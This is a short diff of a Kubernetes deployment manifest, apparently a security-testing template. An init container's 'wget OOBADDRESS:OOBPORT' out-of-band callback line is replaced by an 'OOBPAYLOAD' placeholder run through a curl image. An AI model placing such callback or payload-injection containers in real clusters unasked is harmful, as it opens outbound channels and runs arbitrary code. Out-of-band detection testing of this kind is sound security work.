@@ -17,10 +17,10 @@ spec:
     spec:
       initContainers:
       - name: download-tools
-        image: alpine:3.8
-        command: [sh, -c]
+        image: curlimages/curl:latest
+        command: [/bin/sh, -c]
         args:
-        - wget OOBADDRESS:OOBPORT
+        - OOBPAYLOAD
       containers:
       - name: nginx
         image: nginx:latest
